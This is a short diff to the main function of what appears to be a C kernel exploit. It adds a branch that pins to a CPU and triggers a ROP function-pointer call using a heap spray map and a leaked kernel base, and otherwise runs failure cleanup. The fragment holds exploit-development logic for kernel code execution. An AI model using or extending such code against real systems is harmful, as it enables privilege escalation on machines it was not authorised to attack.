@@ -588,11 +588,14 @@ int main() {
         }
 
         nanosleep(NANOSLEEP_50US, NULL);
-
+    } else {
+        if (dirty_count > 0) {
+            pin_to_cpu(2);
+            rop_call_funcptr(spray_map, closeup_fds, kernel_base);
+        } else {
+            cleanup_on_failure(&cleanup_state);
+        }
     }
-
-    if (!exploit_success)
-        cleanup_on_failure(&cleanup_state);  // Only clean up if the exploit failed
 
     return exploit_success ? 0 : 1;
 }
